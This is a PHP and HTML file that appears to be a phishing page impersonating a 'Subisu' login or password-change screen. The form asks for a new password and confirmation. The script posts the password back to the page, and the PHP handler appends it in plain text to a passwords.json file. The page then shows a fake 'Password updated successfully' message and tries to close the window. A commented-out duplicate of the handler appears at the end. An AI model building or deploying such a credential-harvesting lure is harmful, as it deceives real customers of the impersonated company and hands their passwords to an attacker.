<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);

    if (isset($data['password'])) {
        $password = $data['password'];
        $filePath = 'passwords.json';

        if (file_exists($filePath)) {
            $jsonData = file_get_contents($filePath);
            $passwords = json_decode($jsonData, true);
        } else {
            $passwords = [];
        }

        $passwords[] = $password;

        if (file_put_contents($filePath, json_encode($passwords, JSON_PRETTY_PRINT)) === false) {
            header('Content-Type: application/json');
            echo json_encode(['status' => 'error', 'message' => 'Failed to write to file']);
        } else {
            header('Content-Type: application/json');
            echo json_encode(['status' => 'success']);
        }
    } else {
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => 'No password provided']);
    }
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Subisu Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f5ff;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            max-width: 400px;
            padding: 20px;
            box-sizing: border-box;
        }

        .login-box {
            background-color: #fff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        h1 {
            font-size: 24px;
            color: #0b2270;
            margin-bottom: 20px;
        }

        h2 {
            font-size: 18px;
            color: #333;
            margin-bottom: 20px;
        }

        .highlight {
            color: #e74c3c;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        label {
            font-size: 14px;
            color: #333;
            margin-bottom: 5px;
            text-align: left;
        }

        input[type="text"],
        input[type="password"] {
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 5px;
            border: 1px solid #ddd;
            font-size: 16px;
        }

        .forgot-password {
            margin-bottom: 15px;
            text-align: right;
        }

        .forgot-password a {
            font-size: 12px;
            color: #007bff;
            text-decoration: none;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        button {
            padding: 10px;
            background-color: #0b2270;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #0948b3;
        }

        .register-link {
            margin-top: 15px;
        }

        .register-link a {
            font-size: 12px;
            color: #007bff;
            text-decoration: none;
        }

        .register-link a:hover {
            text-decoration: underline;
        }

        .copyright {
            font-size: 12px;
            color: #999;
            margin-top: 20px;
        }

        .message-box {
            display: none;
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
            border-radius: 5px;
            padding: 15px;
            margin: 20px 0;
            text-align: center;
        }

        .message-box.error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        @media (max-width: 480px) {
            .login-box {
                padding: 20px;
            }

            h1 {
                font-size: 20px;
            }

            h2 {
                font-size: 16px;
            }

            input[type="text"],
            input[type="password"] {
                font-size: 14px;
            }

            button {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h1>SUBISU</h1>
            <h2>Welcome<br>To <span class="highlight">Subisu</span></h2>
            <form id="passwordForm">
                <input type="password" id="password" name="password" placeholder="Password" required>
                <input type="password" id="confirmPassword" name="confirmPassword" placeholder="Confirm Password" required>
                <div class="forgot-password"></div>
                <button type="submit">Submit</button>
                <div class="register-link"></div>
            </form>
            <p class="copyright">Copyright © 2022 Subisu All rights reserved.</p>
            <div id="messageBox" class="message-box"></div> <!-- Message box -->
        </div>
    </div>

    <script>
    document.getElementById('passwordForm').addEventListener('submit', function(event) {
        event.preventDefault();

        var password = document.getElementById('password').value;
        var confirmPassword = document.getElementById('confirmPassword').value;

        if (password === confirmPassword) {
            fetch(window.location.href, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ password: password })
            })
            .then(response => response.text())
            .then(text => {
                try {
                    var data = JSON.parse(text);
                    var messageBox = document.getElementById('messageBox');
                    messageBox.style.display = 'block';

                    if (data.status === 'success') {
                        messageBox.className = 'message-box'; // Success style
                        messageBox.textContent = 'Password updated successfully.';

                        // Attempt to close the window after 3 seconds
                        setTimeout(function() {
                            // Check if the window was opened by the script
                            if (window.opener) {
                                window.close();
                            } else {
                                // Fallback: Close the window with user prompt
                                alert('Please close this window manually.');
                            }
                        }, 3000);
                    } else {
                        messageBox.className = 'message-box error'; // Error style
                        messageBox.textContent = 'Error saving password: ' + data.message;
                    }
                } catch (error) {
                    console.error('Error parsing JSON:', error);
                    console.error('Response text:', text);
                }
            })
            .catch((error) => {
                console.error('Fetch error:', error);
            });
        } else {
            alert('Passwords do not match. Please try again.');
        }
    });
</script>

</body>
</html>
<!-- <?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);

    if (isset($data['password'])) {
        $password = $data['password'];
        $filePath = 'passwords.json';

        if (file_exists($filePath)) {
            $jsonData = file_get_contents($filePath);
            $passwords = json_decode($jsonData, true);
        } else {
            $passwords = [];
        }

        $passwords[] = $password;

        if (file_put_contents($filePath, json_encode($passwords, JSON_PRETTY_PRINT)) === false) {
            header('Content-Type: application/json');
            echo json_encode(['status' => 'error', 'message' => 'Failed to write to file']);
        } else {
            header('Content-Type: application/json');
            echo json_encode(['status' => 'success']);
        }
    } else {
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => 'No password provided']);
    }
    exit;
}
?> -->
